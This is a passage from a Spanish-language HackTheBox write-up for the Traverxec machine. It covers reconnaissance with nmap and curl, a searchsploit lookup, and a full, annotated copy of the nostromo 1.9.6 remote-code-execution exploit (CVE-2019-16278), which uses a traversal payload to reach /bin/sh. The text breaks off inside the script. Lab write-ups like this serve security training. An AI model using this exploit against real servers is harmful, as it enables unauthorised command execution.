@@ -1,0 +1,1616 @@
+<!doctype html><html lang=es>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="noodp">
+<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
+<title>HackTheBox - Traverxec - wixnic</title><meta name=Description content="This is my description."><meta property="og:title" content="HackTheBox - Traverxec">
+<meta property="og:description" content="This is my description.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://wixnic.github.io/es/htb_traverxec/"><meta property="og:image" content="https://wixnic.github.io/logo.png"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-10-22T11:33:00+08:00">
+<meta property="article:modified_time" content="2021-10-22T11:33:00+08:00"><meta property="og:site_name" content="wixnic">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://wixnic.github.io/logo.png">
+<meta name=twitter:title content="HackTheBox - Traverxec">
+<meta name=twitter:description content="This is my description.">
+<meta name=application-name content="wixnic">
+<meta name=apple-mobile-web-app-title content="wixnic"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://wixnic.github.io/es/htb_traverxec/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HackTheBox - Traverxec","inLanguage":"es","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/wixnic.github.io\/es\/htb_traverxec\/"},"image":["https:\/\/wixnic.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"youtube, nostromo, searchsploit, htaccess, htpasswd, linpeas, hashcat, john, ssh-private-keys, gtfobins, journalctl, wget, curl, python","wordcount":3864,"url":"https:\/\/wixnic.github.io\/es\/htb_traverxec\/","datePublished":"2021-10-22T11:33:00+08:00","dateModified":"2021-10-22T11:33:00+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"https:\/\/wixnic.github.io\/images\/avatar.png"},"author":{"@type":"Person","name":"wixnic"},"description":"This is my description."}</script></head>
+<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'auto'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'auto'==='dark')&&document.body.setAttribute('theme','dark')</script>
+<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/es/ title=wixnic><span class=header-title-pre><i class="fas fa-user-ninja"></i></span>wixnic</a>
+</div>
+<div class=menu>
+<div class=menu-inner><a class=menu-item href=/es/> Inicio </a><a class=menu-item href=/es/posts/> Posts </a><a class=menu-item href=/es/tags/> Tags </a><a class=menu-item href=/es/categories/> Categorías </a><a class=menu-item href=/es/about/> Sobre Mí </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item language" title="Selecciona el lenguage">Spanish<i class="fas fa-chevron-right fa-fw"></i>
+<select class=language-select id=language-select-desktop onchange="location=this.value"><option value=/htb_traverxec/>English</option><option value=/es/htb_traverxec/ selected>Spanish</option></select>
+</a><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Busca títulos o contenido..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Buscar>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Limpiar>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-desktop>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Cambia el tema">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class=mobile id=header-mobile>
+<div class=header-container>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/es/ title=wixnic><span class=header-title-pre><i class="fas fa-user-ninja"></i></span>wixnic</a>
+</div>
+<div class=menu-toggle id=menu-toggle-mobile>
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class=menu id=menu-mobile><div class=search-wrapper>
+<div class="search mobile" id=search-mobile>
+<input type=text placeholder="Busca títulos o contenido..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Buscar>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Limpiar>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-mobile>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>
+Cancelar
+</a>
+</div><a class=menu-item href=/es/ title>Inicio</a><a class=menu-item href=/es/posts/ title>Posts</a><a class=menu-item href=/es/tags/ title>Tags</a><a class=menu-item href=/es/categories/ title>Categorías</a><a class=menu-item href=/es/about/ title>Sobre Mí</a><a href=javascript:void(0); class="menu-item theme-switch" title="Cambia el tema">
+<i class="fas fa-adjust fa-fw"></i>
+</a><a href=javascript:void(0); class=menu-item title="Selecciona el lenguage">Spanish<i class="fas fa-chevron-right fa-fw"></i>
+<select class=language-select onchange="location=this.value"><option value=/htb_traverxec/>English</option><option value=/es/htb_traverxec/ selected>Spanish</option></select>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id=search-dropdown-desktop></div>
+</div>
+<div class="search-dropdown mobile">
+<div id=search-dropdown-mobile></div>
+</div>
+<main class=main>
+<div class=container><div class=toc id=toc-auto>
+<h2 class=toc-title>Contenido</h2>
+<div class=toc-content id=toc-content-auto></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">HackTheBox - Traverxec</h1><div class=post-meta>
+<div class=post-meta-line><span class=post-author><a href=/es/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>wixnic</a></span>&nbsp;<span class=post-category>incluido en <a href=/es/categories/hackthebox-nix/><i class="far fa-folder fa-fw"></i>HackTheBox Nix</a></span></div>
+<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-10-22>2021-10-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3864 palabras&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;19 minutos&nbsp;<span id=/es/htb_traverxec/ class=leancloud_visitors data-flag-title="HackTheBox - Traverxec">
+<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;vistas
+</span>&nbsp;</div>
+</div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/thumbnails/HTB-Thumbnail-Traverxec-Spanish.png data-srcset="/images/thumbnails/HTB-Thumbnail-Traverxec-Spanish.png, /images/thumbnails/HTB-Thumbnail-Traverxec-Spanish.png 1.5x, /images/thumbnails/HTB-Thumbnail-Traverxec-Spanish.png 2x" data-sizes=auto alt=/images/thumbnails/HTB-Thumbnail-Traverxec-Spanish.png title="This is my description."></div><div class="details toc" id=toc-static kept>
+<div class="details-summary toc-title">
+<span>Contenido</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
+<ul>
+<li><a href=#setup>Setup</a></li>
+<li><a href=#recon>Recon</a>
+<ul>
+<li><a href=#identificación-de-so>Identificación de SO</a></li>
+<li><a href=#nmap>nmap</a></li>
+<li><a href=#sitio-web---http-tcp-80>Sitio Web - HTTP TCP 80</a></li>
+<li><a href=#shell-como-www-data>Shell como www-data</a>
+<ul>
+<li><a href=#investigación-de-vulnerabilidades>Investigación de Vulnerabilidades</a></li>
+</ul>
+</li>
+<li><a href=#shell-completamente-interactiva>Shell Completamente Interactiva</a></li>
+</ul>
+</li>
+<li><a href=#escalada-de-privilegios-www-data---david>Escalada de Privilegios: www-data -> david</a>
+<ul>
+<li><a href=#linpeas>linPEAS</a></li>
+<li><a href=#htpasswd>.htpasswd</a></li>
+<li><a href=#crack-htpasswd>Crack .htpasswd</a></li>
+<li><a href=#shell-via-ssh>Shell via SSH</a></li>
+</ul>
+</li>
+<li><a href=#escalada-de-privilegios-david---root>Escalada de Privilegios: david -> root</a>
+<ul>
+<li><a href=#enumeración>Enumeración</a></li>
+<li><a href=#abusando-journalctl>Abusando journalctl</a></li>
+</ul>
+</li>
+</ul>
+</nav></div>
+</div><div class=content id=content><h1 id=setup>Setup</h1>
+<p>Como siempre, necesitamos un espacio comodo para trabajar así que voy a crear mis directorios de trabajo con la función mk que tengo definida en mi Z shell:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ which mk
+mk <span class=o>()</span> <span class=o>{</span>
+	mkdir <span class=o>{</span>scans,content,loot,exploits,scripts,report<span class=o>}</span>
+<span class=o>}</span>
+❯ mk
+❯ ls
+ content   exploits   loot   report   scans   scripts
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=recon>Recon</h1>
+<h2 id=identificación-de-so>Identificación de SO</h2>
+<p>Vamos a empezar identificando el sistema operativo del objetivo con la función os de mi Z shell:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ which os
+os <span class=o>()</span> <span class=o>{</span>
+	<span class=nv>ttl</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>ping -c <span class=m>1</span> <span class=nv>$1</span> <span class=p>|</span> awk -F <span class=s1>&#39;ttl=&#39;</span> <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span>  -f <span class=m>1</span> <span class=p>|</span> tr -d <span class=s1>&#39;\n&#39;</span><span class=k>)</span><span class=s2>&#34;</span>
+	<span class=k>if</span> <span class=o>((</span> <span class=nv>$ttl</span> &lt;<span class=o>=</span> <span class=m>64</span> <span class=o>))</span>
+	<span class=k>then</span>
+		<span class=nb>echo</span> <span class=s1>&#39;OS: Unix/Linux&#39;</span>
+	<span class=k>elif</span> <span class=o>((</span> <span class=nv>$ttl</span> &lt;<span class=o>=</span> <span class=m>128</span> <span class=o>))</span>
+	<span class=k>then</span>
+		<span class=nb>echo</span> <span class=s1>&#39;OS: Windows&#39;</span>
+	<span class=k>else</span>
+		<span class=nb>echo</span> <span class=s1>&#39;OS: Not detected&#39;</span>
+	<span class=k>fi</span>
+<span class=o>}</span>
+❯ os 10.10.10.165
+OS: Unix/Linux
+</code></pre></td></tr></table>
+</div>
+</div><p>Como podemos ver, el sistem operativo del objetivo es Linux.</p>
+<h2 id=nmap>nmap</h2>
+<p>nmap revela que los puertos SSH (TCP 22) y HTTP (TCP 80) estan abiertos:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sudo nmap -p- -n -Pn --min-rate <span class=m>5000</span> -oG scans/nmap-tcpall 10.10.10.165
+<span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> wixnic:
+Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-10-17 18:11 AST
+Nmap scan report <span class=k>for</span> 10.10.10.165
+Host is up <span class=o>(</span>0.094s latency<span class=o>)</span>.
+Not shown: <span class=m>65533</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 26.52 seconds
+❯ which xp
+xp <span class=o>()</span> <span class=o>{</span>
+	<span class=nv>ports</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>cat <span class=nv>$1</span> <span class=p>|</span> grep -oP <span class=s1>&#39;\d{1,5}/open&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f <span class=m>1</span> <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed s/,$//<span class=k>)</span><span class=s2>&#34;</span>
+	<span class=nb>echo</span> <span class=s2>&#34;[+] Open ports: </span><span class=nv>$ports</span><span class=s2>&#34;</span> &gt;&gt; xp.tmp
+	<span class=nb>printf</span> <span class=nv>$ports</span> <span class=p>|</span> xclip -sel clip
+	<span class=nb>echo</span> <span class=s2>&#34;[+] Ports copied to clipboard&#34;</span> &gt;&gt; xp.tmp
+	/usr/bin/bat xp.tmp
+	rm xp.tmp
+<span class=o>}</span>
+❯ xp scans/nmap-tcpall
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: xp.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   <span class=m>1</span>   │ <span class=o>[</span>+<span class=o>]</span> Open ports: 22,80
+   <span class=m>2</span>   │ <span class=o>[</span>+<span class=o>]</span> Ports copied to clipboard
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ sudo nmap -p22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.165
+Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-10-17 18:12 AST
+Nmap scan report <span class=k>for</span> 10.10.10.165
+Host is up <span class=o>(</span>0.10s latency<span class=o>)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+<span class=p>|</span> ssh-hostkey:
+<span class=p>|</span>   <span class=m>2048</span> aa:99:a8:16:68💿41:cc:f9:6c:84:01:c7:59:09:5c <span class=o>(</span>RSA<span class=o>)</span>
+<span class=p>|</span>   <span class=m>256</span> 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class=o>(</span>ECDSA<span class=o>)</span>
+<span class=p>|</span>_  <span class=m>256</span> 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class=o>(</span>ED25519<span class=o>)</span>
+80/tcp open  http    nostromo 1.9.6
+<span class=p>|</span>_http-title: TRAVERXEC
+<span class=p>|</span>_http-server-header: nostromo 1.9.6
+Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 13.14 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>La versión de OpenSSH revela que la distribución del objetivo pinta ser Debian y que el servicio web es nostromo 1.9.6.</p>
+<h2 id=sitio-web---http-tcp-80>Sitio Web - HTTP TCP 80</h2>
+<p>Podemos ver que el nombre del servicio <code>nostromo 1.9.6</code> es identificado a través del servicio web con el encabezado o header llamado <code>Server</code> del protocolo HTTP:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>❯ curl -I 10.10.10.165
+</span><span class=err></span><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
+<span class=n>Date</span><span class=o>:</span> <span class=l>Sun, 17 Oct 2021 22:19:35 GMT</span>
+<span class=n>Server</span><span class=o>:</span> <span class=l>nostromo 1.9.6</span>
+<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+<span class=n>Last-Modified</span><span class=o>:</span> <span class=l>Fri, 25 Oct 2019 21:11:09 GMT</span>
+<span class=n>Content-Length</span><span class=o>:</span> <span class=l>15674</span>
+<span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Nota: -I = ¡Obtén solo los encabezados! Los servidores HTTP cuentan con el comando HEAD que se usa para obtener nada más que el encabezado de un documento.</p>
+</blockquote>
+<h2 id=shell-como-www-data>Shell como www-data</h2>
+<h3 id=investigación-de-vulnerabilidades>Investigación de Vulnerabilidades</h3>
+<p>Usaré searchsploit para encontrar exploits mientras uso el nombre del servicio HTTP que es nostromo, searchsploit muestra tres vulnerabilidades potenciales de Nostromo:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ searchsploit nostromo
+------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                         <span class=p>|</span>  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Nostromo - Directory Traversal Remote Command Execution <span class=o>(</span>Metasploit<span class=o>)</span>                                                                                   <span class=p>|</span> multiple/remote/47573.rb
+nostromo 1.9.6 - Remote Code Execution                                                                                                                 <span class=p>|</span> multiple/remote/47837.py
+nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                                                   <span class=p>|</span> linux/remote/35466.sh
+------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+❯ searchsploit -m multiple/remote/47837.py
+  Exploit: nostromo 1.9.6 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47837
+     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
+File Type: Python script, ASCII text executable
+
+Copied to: /home/wixnic/htb/traverxec/47837.py
+</code></pre></td></tr></table>
+</div>
+</div><p>Hay uno de metasploit, luego un script de Python y un script de shell. El script de shell es un exploit para una versión anterior, así que lo ignoraremos. Comencemos primero con el exploit de Python.</p>
+<p>Código de Python:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># Exploit Title: nostromo 1.9.6 - Remote Code Execution</span>
+<span class=c1># Date: 2019-12-31</span>
+<span class=c1># Exploit Author: Kr0ff</span>
+<span class=c1># Vendor Homepage:</span>
+<span class=c1># Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</span>
+<span class=c1># Version: 1.9.6</span>
+<span class=c1># Tested on: Debian</span>
+<span class=c1># CVE : CVE-2019-16278</span>
+
+<span class=c1># Esta línea debe comentarse o eliminarse</span>
+<span class=c1>#cve2019_16278.py</span>
+
+<span class=c1>#!/usr/bin/env python</span>
+
+<span class=kn>import</span> <span class=nn>sys</span>
+<span class=kn>import</span> <span class=nn>socket</span>
+
+<span class=n>art</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
+</span><span class=s2>
+</span><span class=s2>                                        _____-2019-16278
+</span><span class=s2>        _____  _______    ______   _____\    </span><span class=se>\
+</span><span class=se></span><span class=s2>   _____\    \_\      |  |      | /    / |    |
+</span><span class=s2>  /     /|     ||     /  /     /|/    /  /___/|
+</span><span class=s2> /     / /____/||\    \  \    |/|    |__ |___|/
+</span><span class=s2>|     | |____|/ \ \    \ |    | |       </span><span class=se>\
+</span><span class=se></span><span class=s2>|     |  _____   \|     \|    | |     __/ __
+</span><span class=s2>|\     \|\    \   |\         /| |\    \  /  </span><span class=se>\
+</span><span class=se></span><span class=s2>| \_____\|    |   | \_______/ | | \____\/    |
+</span><span class=s2>| |     /____/|    \ |     | /  | |    |____/|
+</span><span class=s2> \|_____|    ||     \|_____|/    \|____|   | |
+</span><span class=s2>        |____|/                        |___|/
+</span><span class=s2>
+</span><span class=s2>
+</span><span class=s2>
+</span><span class=s2>&#34;&#34;&#34;</span>
+
+<span class=n>help_menu</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>Usage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;&#39;</span>
+
+<span class=k>def</span> <span class=nf>connect</span><span class=p>(</span><span class=n>soc</span><span class=p>):</span>
+	<span class=c1># Define una respuesta vacía</span>
+    <span class=n>response</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+    <span class=k>try</span><span class=p>:</span>
+        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+			<span class=c1># Defina 1024 bytes como la cantidad de bytes recibidos por el socket.</span>
+			<span class=c1># Nota: Para que coincida mejor con las realidades del hardware y la red, el valor de bufsize debe ser una potencia relativamente pequeña de 2, por ejemplo, 4096. En este caso es 2 ^ 10 = 1024</span>
+            <span class=n>connection</span> <span class=o>=</span> <span class=n>soc</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
+			<span class=c1># Si no hay conexión, rompe (termina)</span>
+            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>connection</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+                <span class=k>break</span>
+			<span class=c1># Si hay una conexión, agréguela a la variable de response</span>
+            <span class=n>response</span> <span class=o>+=</span> <span class=n>connection</span>
+    <span class=c1># Si no recibe una conexión, pase (continúe)</span>
+	<span class=k>except</span><span class=p>:</span>
+        <span class=k>pass</span>
+	<span class=c1># Devuelve la respuesta</span>
+    <span class=k>return</span> <span class=n>response</span>
+
+<span class=k>def</span> <span class=nf>cve</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>
+	<span class=c1># Define el socket</span>
+    <span class=n>soc</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
+	<span class=c1># Se conecta a la IP y al PUERTO de destino</span>
+    <span class=n>soc</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>target</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>port</span><span class=p>)))</span>
+	<span class=c1># Define el payload</span>
+    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;POST /.</span><span class=si>%0d</span><span class=s1>./.</span><span class=si>%0d</span><span class=s1>./.</span><span class=si>%0d</span><span class=s1>./.</span><span class=si>%0d</span><span class=s1>./bin/sh HTTP/1.0</span><span class=se>\r\n</span><span class=s1>Content-Length: 1</span><span class=se>\r\n\r\n</span><span class=s1>echo</span><span class=se>\n</span><span class=s1>echo</span><span class=se>\n</span><span class=si>{}</span><span class=s1> 2&gt;&amp;1&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
+	<span class=c1># Envía el payload a la IP y al PUERTO de destino</span>
+    <span class=n>soc</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+	<span class=c1># Recibe una conexión</span>
+    <span class=n>receive</span> <span class=o>=</span> <span class=n>connect</span><span class=p>(</span><span class=n>soc</span><span class=p>)</span>
+	<span class=c1># Imprime el valor recibido</span>
+    <span class=nb>print</span><span class=p>(</span><span class=n>receive</span><span class=p>)</span>
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+
+	<span class=c1># Imprime el banner art</span>
+    <span class=nb>print</span><span class=p>(</span><span class=n>art</span><span class=p>)</span>
+
+    <span class=k>try</span><span class=p>:</span>
+        <span class=n>target</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
+        <span class=n>cmd</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
+		
